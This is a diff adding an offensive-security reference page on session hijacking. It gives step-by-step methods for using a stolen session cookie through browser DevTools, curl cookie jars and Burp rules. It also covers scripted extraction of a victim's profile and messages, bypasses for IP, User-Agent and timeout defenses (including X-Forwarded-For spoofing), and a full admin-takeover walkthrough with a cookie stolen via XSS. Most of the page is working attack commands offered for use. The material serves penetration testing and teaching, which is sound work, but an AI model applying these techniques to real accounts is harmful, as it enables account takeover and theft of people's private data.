@@ -1,0 +1,310 @@
+---
+title: Hijacking
+description: The mechanics of taking a session identifier you've stolen and using it - browser DevTools cookie swap, Burp Repeater/Intercept cookie swap, curl with -b/-c, and the cookie-jar discipline for multi-request workflows.
+mitre: [T1539, T1550.004, T1185]
+d3fend: [D3-CBV]
+impact: [SessionTakeover, AuthBypass]
+owasp: [A07]
+sidebar:
+  order: 2
+  label: Hijacking
+---
+
+## TL;DR
+
+Once you have a victim's session cookie, hijacking is purely mechanical - open a browser, paste the cookie, navigate. The cookie is the authentication. No password prompt, no further check. Three tool patterns cover essentially every hijacking scenario:
+
+```
+# 1. Browser DevTools - fastest for human-driven verification
+#    F12 → Storage → Cookies → double-click value → paste stolen cookie → refresh
+
+# 2. curl - best for scripting and automation
+curl -b 'auth-session=eyJhbGciOi...; PHPSESSID=ab4530f4...' \
+     http://target/account/
+
+# 3. Burp Repeater - best for iterative manual exploration
+#    Send any request to Repeater → edit the Cookie header → Send
+#    Use "Match and Replace" rules for whole-session swap during browsing
+```
+
+Success indicator: a request you make returns the victim's view of the application - their account page renders as if they'd logged in, their data is visible, the username shown is theirs and not yours.
+
+## The hijacking mechanic in one paragraph
+
+Web apps issue a session cookie at login. Every subsequent request to a protected resource is authorized by that cookie. The server looks up the session record server-side using the cookie's value as the key and uses that record to know "this is user X." The cookie's value is *the* credential for the duration of the session. Theft is logical equivalence to login.
+
+This sounds trivial - and it is - but several operational details matter for clean, repeatable hijacking.
+
+## Method 1 - Browser DevTools cookie swap
+
+The fastest way to demonstrate a finding and the closest to "live as the victim."
+
+### Firefox
+
+1. Open the target's login page or any page on the same origin
+2. Press `F12` → Storage → Cookies → select the origin
+3. Double-click the value cell of the session cookie
+4. Paste the stolen value, press Enter
+5. Reload the page
+
+You are now logged in as the victim. Every subsequent request from that browser uses the swapped cookie.
+
+### Chrome / Edge / Brave
+
+1. Open the target on the same origin
+2. F12 → Application → Cookies → select the origin
+3. Double-click the value cell
+4. Paste, Enter, reload
+
+The DevTools cookie editor accepts pasted values verbatim - but watch for line breaks. If you paste a value with trailing whitespace or a stray newline, the cookie won't be valid.
+
+### Private window discipline
+
+Always do the swap in a **private/incognito window** or a fresh browser profile. Why:
+
+- Your own session cookie for the target is already in the regular browser; you'll either confuse yourself about which identity is active, or accidentally use the wrong one for a critical action.
+- Private windows have no other cookies, no localStorage, no extension state - minimizes the variables.
+- When you're done, close the window and the hijacked session disappears (assuming the cookie wasn't `Persistent`).
+
+## Method 2 - curl
+
+curl is the right tool for scripted hijacking, automated enumeration of a victim's data, and any workflow that needs hundreds of requests.
+
+### The `-b` flag (read cookies)
+
+```shell
+# Single cookie
+curl -b 'auth-session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoianVsaWUifQ.xxx' \
+     http://target/account/
+
+# Multiple cookies
+curl -b 'auth-session=ABC; PHPSESSID=xyz; csrf_token=def' \
+     http://target/account/
+
+# Cookie file (Netscape format)
+curl -b cookies.txt http://target/account/
+```
+
+The cookie syntax is the same as the browser's `Cookie:` header - semicolon-separated name=value pairs.
+
+### The `-c` flag (write cookies)
+
+`-c` writes any `Set-Cookie` headers from responses to a file. Combined with `-b`, this maintains a cookie jar across requests:
+
+```shell
+# Initial login (or initial victim-cookie injection) - write to cookies.txt
+curl -c cookies.txt -X POST \
+     -d 'username=victim&password=hijack' \
+     http://target/login
+
+# Subsequent requests - read and write back, so any session-rotation Set-Cookies are caught
+curl -b cookies.txt -c cookies.txt http://target/account/
+curl -b cookies.txt -c cookies.txt http://target/messages/
+curl -b cookies.txt -c cookies.txt http://target/admin/
+```
+
+### Manually building a cookie file
+
+If you only have one cookie value from a leak, you can build the cookies.txt manually:
+
+```
+# Netscape HTTP Cookie File
+# domain  HttpOnly  path  Secure  expiration  name  value
+target.com  FALSE  /  FALSE  0  auth-session  eyJhbGciOiJIUzI1NiJ9...
+```
+
+Tab-separated, one cookie per line. The `0` expiration means session cookie (expires when curl exits). Setting all flags to FALSE keeps things simple - no `HttpOnly` or `Secure` constraints matter to curl since curl doesn't enforce them.
+
+### Header overrides
+
+When the cookie has special characters or you want to send extra headers:
+
+```shell
+curl -H 'Cookie: auth-session=ABC; PHPSESSID=xyz' \
+     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0' \
+     -H 'Accept-Language: en-US,en;q=0.5' \
+     http://target/account/
+```
+
+Matching the victim's likely User-Agent is sometimes necessary - some apps tie sessions to UA and reject a swap if the UA mismatches dramatically. Less common than tying to IP (also broken - see "Anti-hijack defenses" below) but worth knowing.
+
+## Method 3 - Burp Repeater / Intercept
+
+Burp's strength is iterative manual exploration of an authenticated session.
+
+### Single-request swap
+
+1. Browse the target normally (your own session)
+2. Send any authenticated request to Repeater (right-click → Send to Repeater)
+3. Edit the `Cookie:` header in the Repeater request - replace your session value with the victim's
+4. Click Send
+
+The response in Repeater is now from the victim's perspective. Iterate freely without affecting the rest of your browsing.
+
+### Session-wide swap via Match-and-Replace
+
+To browse the entire application as the victim:
+
+1. Burp → Proxy → Options → Match and Replace
+2. Add rule:
+   - Type: Request Header
+   - Match: `Cookie:.*auth-session=[^;]+`
+   - Replace: `Cookie: auth-session=VICTIM_COOKIE_VALUE`
+3. Enable the rule
+
+Now every request your browser makes through Burp gets rewritten to use the victim's cookie. You browse the app and Burp transparently swaps the identity.
+
+Two cautions with Match-and-Replace:
+
+- **Other cookies vanish.** The replacement above clobbers the entire Cookie header. If the app needs other cookies (CSRF, language preference, A/B test ID), preserve them.
+- **It applies to every request through Burp.** Don't forget to disable when you're done, or your "log out" click will be ignored because Burp re-injects the victim cookie.
+
+### Cookie Jar (Session Handling Rules)
+
+For the cleanest version of session-wide swap, Burp has Session Handling Rules:
+
+1. Project options → Sessions → Session Handling Rules → Add
+2. Scope to your target
+3. Action: Set a specific cookie value
+4. Cookie name: `auth-session`
+5. Value: VICTIM_COOKIE_VALUE
+
+This is more surgical than Match-and-Replace because it only operates on the specified cookie, leaving the rest of the cookie jar intact.
+
+## The Storage tab pitfall
+
+When you swap a cookie in DevTools, you're swapping *only* the cookie. If the app also stores session-related data in `localStorage` or `sessionStorage`, those don't get swapped. Some apps:
+
+- Store the auth token in a cookie (for HttpOnly safety) AND read it via XHR (for UI display)
+- Store user preferences and the user's ID in localStorage
+- Use a separate "remember me" token in localStorage that re-authenticates if the cookie expires
+
+After swap, the app may behave inconsistently: server thinks you're the victim (cookie says so) but UI shows your old account name (localStorage cache). Workaround:
+
+1. Clear localStorage and sessionStorage in DevTools (Application → Storage → Clear site data)
+2. *Then* set the cookie
+3. *Then* navigate to the target page (let the app re-populate localStorage from the now-victim session)
+
+Or just open a fresh private window and only set the cookie; the empty storage is then the victim's freshly-issued state.
+
+## curl + jq for fast data extraction
+
+Once you have a victim cookie and the app has an API endpoint, scripted extraction is fast:
+
+```shell
+# Dump the victim's profile
+curl -s -b 'auth-session=ABC' http://target/api/profile | jq
+
+# List all the victim's messages
+curl -s -b 'auth-session=ABC' http://target/api/messages | jq '.[] | {from, subject, date}'
+
+# Walk through paginated data
+for page in $(seq 1 20); do
+  curl -s -b 'auth-session=ABC' "http://target/api/messages?page=$page" \
+    | jq -r '.[] | "\(.id)\t\(.from)\t\(.subject)"'
+done
+```
+
+This is the right form for "I have the cookie, document what the victim has access to" - much faster than clicking through the UI.
+
+## Anti-hijack defenses you may encounter
+
+Some apps add defenses beyond "the cookie is the credential." Common ones:
+
+| Defense | How it works | Bypass |
+| --- | --- | --- |
+| **IP binding** | Server records the IP that the session was issued for; rejects requests from different IPs | If you're behind the same NAT, on the same VPN, or can spoof headers like `X-Forwarded-For`, this fails open |
+| **User-Agent binding** | Server records the UA at login; rejects requests with different UA | Match the victim's UA exactly (often visible in server logs or via `User-Agent` you sniffed) |
+| **Fingerprint binding** | Server uses a JS fingerprint stored in cookie/localStorage at login | More fragile - fingerprint changes constantly, browser refresh sometimes invalidates the session, defense is rarely deployed in practice |
+| **Concurrent-session limit** | Only one active session per user at a time; victim's session ends when you log in elsewhere | Race the victim's activity; or accept that you'll log them out (alerting them) |
+| **Idle timeout** | Session expires after N minutes of inactivity | Re-issue requests every few minutes via automation to keep alive |
+| **Absolute timeout** | Session expires after N hours regardless | Re-steal if you can; otherwise the hijack window is bounded |
+| **Re-auth for sensitive actions** | Some actions (password change, payment) prompt for re-auth even mid-session | Hijack covers everything except those specific actions |
+
+### The `X-Forwarded-For` trick
+
+When a target is behind a load balancer that sets `X-Forwarded-For` and the app blindly trusts it for IP-binding, you can sometimes spoof the victim's IP:
+
+```shell
+curl -H 'X-Forwarded-For: 198.51.100.42' \
+     -b 'auth-session=ABC' \
+     http://target/account/
+```
+
+If 198.51.100.42 is the victim's address and the app trusts `X-Forwarded-For` over the actual TCP peer, you've defeated the IP binding.
+
+Other headers worth trying: `X-Real-IP`, `Client-IP`, `X-Originating-IP`, `Forwarded`, `True-Client-IP`. Bug-bounty reports have shown that nearly every header that any proxy *could* set has been blindly trusted by some app.
+
+## A working hijack walkthrough
+
+Suppose you've stolen this cookie via XSS:
+
+```
+auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx
+```
+
+Step by step:
+
+```shell
+# 1. Confirm it's valid
+$ curl -s -o /dev/null -w '%{http_code}\n' \
+       -b 'auth-session=eyJhbGciOi...' \
+       http://target/account/
+200
+
+# 2. Pull the user identity to confirm whose session you've got
+$ curl -s -b 'auth-session=eyJhbGciOi...' \
+       http://target/api/me | jq
+{
+  "id": 1,
+  "username": "admin",
+  "email": "admin@target.com",
+  "role": "administrator"
+}
+
+# 3. Pull a sensitive resource as proof
+$ curl -s -b 'auth-session=eyJhbGciOi...' \
+       http://target/admin/users | jq '.[] | {id, username, email}' > admin-users.json
+
+# 4. Open a private browser window for the "live" view, paste cookie, navigate
+$ firefox --private-window http://target/
+
+# 5. Demonstrate the full admin UI for the report screenshot
+```
+
+This is the entire post-cookie-theft workflow. Five commands, five minutes, a full account takeover.
+
+## Tooling shortcuts
+
+### EditThisCookie / Cookie-Editor browser extensions
+
+For one-click cookie import/export between browsers and DevTools:
+
+- **Cookie-Editor** (Chrome/Firefox): paste a JSON cookie blob and it sets them all at once
+- **EditThisCookie** (Chrome): older, similar interface
+
+These are convenience tools - they do nothing DevTools can't, but the JSON-blob workflow is faster when stealing multiple cookies.
+
+### Cookie copy from Burp to curl
+
+In Burp Repeater, right-click a request → Copy as curl command. The resulting curl invocation includes the cookie header verbatim. Paste, edit the cookie value to the victim's, ready to script.
+
+### sslyze and Wireshark for older targets
+
+If a target serves the session cookie without `Secure` flag and uses plaintext HTTP for any page, Wireshark capture grabs the cookie automatically. See [Obtaining tokens](/codex/web/sessions/obtaining-tokens/).
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Swap cookie in Firefox DevTools | F12 → Storage → Cookies → double-click value |
+| Swap cookie in Chrome DevTools | F12 → Application → Cookies → double-click value |
+| One-shot curl with cookie | `curl -b 'name=value' http://target/path` |
+| Multiple cookies | `curl -b 'a=1; b=2; c=3' URL` |
+| Cookie jar (persist & follow Set-Cookie) | `curl -b cookies.txt -c cookies.txt URL` |
+| Custom Cookie header | `curl -H 'Cookie: name=value' URL` |
+| Burp Repeater swap | Send to Repeater, edit Cookie header, Send |
+| Burp session-wide swap | Match-and-Replace OR Session Handling Rules |
+| Identify victim | `curl -s -b 'session=X' http://target/api/me \| jq` |
+| Spoof IP for IP-bound sessions | `-H 'X-Forwarded-For: VICTIM_IP'` |
+| Clear local storage before swap | DevTools → Application → Storage → Clear site data |
